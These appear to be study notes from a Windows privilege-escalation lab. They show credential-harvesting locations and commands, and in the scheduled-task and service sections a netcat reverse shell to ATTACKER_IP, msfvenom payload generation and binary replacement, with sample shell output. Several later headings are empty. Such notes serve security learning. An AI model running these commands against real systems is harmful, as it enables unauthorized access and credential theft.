# Windows Privilege Escalation
* Using given access to a host with "user A".
* Abuse a weakness to gain access to "user B" on the system.
* May have to escalate into other unprivileged users before gaining administrative privileges.
* May find credentials in unsecured text files / spreadsheets.
* May have to abuse a weakness.
  * Service / scheduled task misconfigurations.
  * Excessive account privileges.
  * Vulnerable software.
  * Missing OS security patches.
## Windows Users

| User | Privileges
| --- | ---
| Administrators | Most privileges. Can change any system configuration parameter and access any file on the system.  Will be a member of the **Administrators** group.
| Standard Users | Can only perform limited tasks. Typically cannot make permanent or essential changes to the system and are limited to their own files.  Will be part of the **Users** group.
| SYSTEM / LocalSystem | Used by the OS to perfrom internal tasks. Full access to all files and resources on the system with even higher privileges than administrators.
| Local Service | Default account used to run services with "minimum" privileges. Uses anonymous connections over the network.
| Network Service | Default account used to run services with "minimum" privileges. Uses the computer credentials to authenticate through the network.

# Harvesting Passwords from Usual spots
* Easiest way to gain access to another user is to gather credentials from a compromised machine.
## Unattended Windows Installations
* Administrators may use Windows Deployment Services (WDS) when installing Windows on a large number of hosts.
  * Single OS system image deployed to many hosts through the network.
  * AKA unattended installations.
    * Does not require user interaction.
  * Requires administrator account to perfrom initial setup.
    * Credentials may be stored on the machine.
      * `C:\Unattend.xml`
      * `C:\Windows\Panther\Unattend.xml`
      * `C:\Windows\Panther\Unattend\Unattend.xml`
      * `C:\Windows\system32\sysprep.inf`
      * `C:\Windows\system32\sysprep\sysprep.xml`
## PowerShell History
* Commands run using PowerShell are stored in a file.
* Useful for quickly repeating commands used before.
* User may include a password directly in a command.
* Retrieve history using `cmd.exe`.
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
* Retrieve history using PowerShell.
```
$ENV:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
## Saved Windows Credentials
* Windows allows other credentials to be used.
* List saved credentials (cannot see passwords).
```
cmdkey /list
```
* Sample output.
```
Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```
* Try any "interesting" credentials using `runas`.
```
runas /savecred /user:mike.katz cmd.exe
```
## Internet Information Services (IIS) Configuration
* Default web server on Windows.
* Configuration stored in `web.config` file.
  * This may store database passwords or configured authentication mechanisms.
* Possible `web.config` locations.
  * `C:\inetpub\wwwroot\web.config`
  * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
* Find database connection string in the file.
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
* Sample output.
```
<add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
<add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
<connectionStrings>
<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```
## Retrieve Credentials from Software: PuTTY
* PuTTY is SSH client commonly found on Windows systems.
* Users can store sessions where proxy configurations may include cleartext authentication credentials.
* Retrieve stored proxy credentials from the registry.
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
* Sample output.
```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```
* Any software that stores passwords (browsers, email clients, FTP clients, SSH clients VNC software) may have methods to recover passwords saved by the user.

# Other Quick Wins
* Some misconfigurations can allow higher privileged user access to be obtained.

## Scheduled Tasks
* May find a scheduled task that either lost its binary or is using a binary that can be modified.
* Use `schtasks` to list sheduled tasks.
* Detailed information can be retrieved about any of the services.
```
schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
``` 
* `Task to Run` parameter indicates what gets executed by the scheduled task.
* `Run as User` parameter shows the user that will execute the task.
* What gets executed by the "Run as User" can be controlled if current user can modify "Task to Run".
  * Results in simple privilege escalation.
* Check File permissions on executable.
```
icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
* `(F)` means full access over the binary.
  * Can modify .bat and insert any payload.
* Change bat file to spawn reverse shell.
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
* Start listener on attacker machine.
```
nc -lvnp 4444
Listening on 0.0.0.0 4444
```
* Attacker will recieve reverse shell with taskusr1 privileges when sheduled task next runs.
* Start task manually (if current user has permissions).
```
schtasks /run /tn vulntask
```
* Attacker will immediately receive the reverse shell.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
## AlwaysInstallElevated
* Windows installer files (.msi) usually run with privilege level of user that executed it.
  * Can be configured to run with higher privileges.
* Generate malicious MSI file that runs with admin privileges.
* Requires two registry values to be set to exploit the vulnerabilty.
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
* Generate MSI reverse shell file using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.189.232 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
* Transfer malicious file to target.
* Run properly configured Metasploit handler module on attacking machine.
* Run installer on target to receive the reverse shell.
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
# Abusing Service Misconfigurations
## Windows Services
* Managed by Service Control Manager (SCM).
* Each service has associated executable run by SCM whenever service is started.
* Not any executable can be started as a service successfully.
  * Service executables implement special functions to communicate with SCM.
* Services specify the user account under which they will run.
* `sc qc` shows structure of `apphostsvc` service.
```
sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
``` 
* **BINARY_PATH_NAME** specifies associated executable.
* **SERVICE_START_NAME** species the account used to run the service.
* Services have a Discretionary Access Control List (DACL).
  * Defines who has permission to start, stop, pause, query status, query configuration, or reconfigure the service.
* DACL can be seen from Process Hacker.
* All services configurations are stored in the registry.
```
HKLM\SYSTEM\CurrentControlSet\Services\
```
* Subkey exists for each service.
  * **ImagePath** shows associated executable.
  * **ObjectName** shows account used to start the service.
  * **Security** stores DACL if configured for the service.
* Only administrators can modify these registry entries by default.

## Insecure Permissions on Service Executable
* Attacker can gain privileges of service's account trivially.
* Splinterware System Scheduler vulnerability example.
```
sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
* Check permissions on the executable.
```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
* Everyone group has modify permissions `(M)` on executable.
  * Can be overwritten with malicious payload.
* Service will be executed with privileges of "svcuser1" user account.
* Generate exe-service payload using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
``` 
* Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
``` 
* Replace service executable with payload.
```
cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.
```
* Grant full permissions to Everyone group as need another user to execute payload.
```
icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```
* Start reverse listener on attacking machine.
```
nc -lvnp 4445
Listening on 0.0.0.0 4445
```
* Restart service (if current user has permissions).
```
Set-Content stop windowsscheduler
Set-Content start windowsscheduler
```
* Reverse shell with svcusr1 privileges received.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```
## Unquoted Service Paths
## Insecure Service Permissions

# Abusing Dangerous Privileges


# Abusing Vulnerable Software


# Tools of the Trade


# Conclusion
